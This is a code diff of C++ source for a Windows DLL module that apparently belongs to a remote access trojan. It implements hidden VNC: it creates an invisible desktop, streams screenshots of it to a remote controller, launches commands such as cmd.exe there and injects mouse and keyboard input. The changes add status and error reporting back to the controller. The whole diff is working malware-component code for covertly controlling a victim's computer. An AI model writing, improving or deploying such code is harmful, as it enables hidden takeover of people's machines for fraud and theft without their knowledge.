@@ -86,6 +86,20 @@ static bool safe_send_raw(SOCKET sock, const vector<unsigned char>& data) {
     return true;
 }
 
+static bool safe_send_json(SOCKET sock, const json& data) {
+    lock_guard<mutex> lock(g_sendMutex);
+    string serialized = data.dump() + "\r\n";
+    const char* ptr = serialized.c_str();
+    int remaining = (int)serialized.size();
+    while (remaining > 0) {
+        int sent = send(sock, ptr, remaining, 0);
+        if (sent == SOCKET_ERROR || sent <= 0) return false;
+        ptr += sent;
+        remaining -= sent;
+    }
+    return true;
+}
+
 static bool safe_send_hvnc_frame(SOCKET sock, int scale, int fps, int width, int height, const vector<unsigned char>& jpegBytes) {
     if (jpegBytes.empty() || sock == INVALID_SOCKET) return false;
 
@@ -110,7 +124,15 @@ static bool safe_send_hvnc_frame(SOCKET sock, int scale, int fps, int width, int
     memcpy(packet.data() + sizeof(PacketHeader) + sizeof(HVNCFrameHeader), jpegBytes.data(), jpegBytes.size());
 
     lock_guard<mutex> lock(g_sendMutex);
-    return safe_send_raw(sock, packet);
+    const char* ptr = (const char*)packet.data();
+    int remaining = (int)packet.size();
+    while (remaining > 0) {
+        int sent = send(sock, ptr, remaining, 0);
+        if (sent == SOCKET_ERROR || sent <= 0) return false;
+        ptr += sent;
+        remaining -= sent;
+    }
+    return true;
 }
 
 static bool ensure_gdiplus() {
@@ -169,17 +191,49 @@ static bool bitmap_to_jpeg(HBITMAP hBmp, ULONG quality, vector<unsigned char>& b
     return true;
 }
 
+static void send_status(const string& msg) {
+    if (g_socket == INVALID_SOCKET) return;
+    json status;
+    status["action"] = "hvnc_status";
+    status["message"] = msg;
+    safe_send_json(g_socket, status);
+}
+
+static void send_error(const string& msg) {
+    if (g_socket == INVALID_SOCKET) return;
+    json err;
+    err["action"] = "hvnc_error";
+    err["message"] = msg;
+    safe_send_json(g_socket, err);
+}
+
 static void ensure_desktop() {
     if (g_hHiddenDesktop) return;
     g_hHiddenDesktop = OpenDesktopW(g_desktopName.c_str(), 0, FALSE, GENERIC_ALL);
     if (!g_hHiddenDesktop) {
         g_hHiddenDesktop = CreateDesktopW(g_desktopName.c_str(), NULL, NULL, 0, GENERIC_ALL, NULL);
     }
+    if (!g_hHiddenDesktop) {
+        send_error("Failed to create hidden desktop");
+    } else {
+        send_status("Hidden desktop ready");
+    }
 }
 
 static void capture_loop() {
     ensure_desktop();
-    SetThreadDesktop(g_hHiddenDesktop);
+    if (!g_hHiddenDesktop) {
+        g_captureRunning = false;
+        return;
+    }
+
+    if (!SetThreadDesktop(g_hHiddenDesktop)) {
+        send_error("Failed to attach capture thread to desktop");
+        g_captureRunning = false;
+        return;
+    }
+
+    send_status("Capture started");
     while (g_captureRunning) {
         DWORD start = GetTickCount();
         int scale, fps;
@@ -219,11 +273,21 @@ static void capture_loop() {
         DWORD interval = 1000 / (fps > 0 ? fps : 1);
         if (elapsed < interval) Sleep(interval - elapsed);
     }
+    send_status("Capture stopped");
 }
 
 static void input_loop() {
     ensure_desktop();
-    SetThreadDesktop(g_hHiddenDesktop);
+    if (!g_hHiddenDesktop) {
+        g_inputRunning = false;
+        return;
+    }
+
+    if (!SetThreadDesktop(g_hHiddenDesktop)) {
+        g_inputRunning = false;
+        return;
+    }
+
     while (g_inputRunning) {
         InputTask task;
         {
@@ -292,6 +356,8 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             g_scalePercent = cmd.value("quality", 50);
         } else if (action == "hvnc_run") {
             ensure_desktop();
+            if (!g_hHiddenDesktop) return;
+
             wstring wpath = utf8_to_wstring(cmd.value("path", "cmd.exe"));
             vector<wchar_t> pathBuffer(wpath.begin(), wpath.end());
             pathBuffer.push_back(L'\0');
@@ -302,6 +368,9 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             if (CreateProcessW(NULL, pathBuffer.data(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                 CloseHandle(pi.hProcess);
                 CloseHandle(pi.hThread);
+                send_status("Process started on hidden desktop");
+            } else {
+                send_error("Failed to start process");
             }
         } else if (action.find("hvnc_mouse") != string::npos || action.find("hvnc_key") != string::npos) {
             lock_guard<mutex> lock(g_inputMutex);
@@ -313,8 +382,6 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
 
 BOOL APIENTRY DllMain(HMODULE, DWORD reason, LPVOID) {
     if (reason == DLL_PROCESS_DETACH) {
-        // We cannot join threads here due to loader lock.
-        // We signal them to stop and let the OS clean up or hope they exit naturally.
         g_captureRunning = false;
         g_inputRunning = false;
         g_inputCV.notify_all();
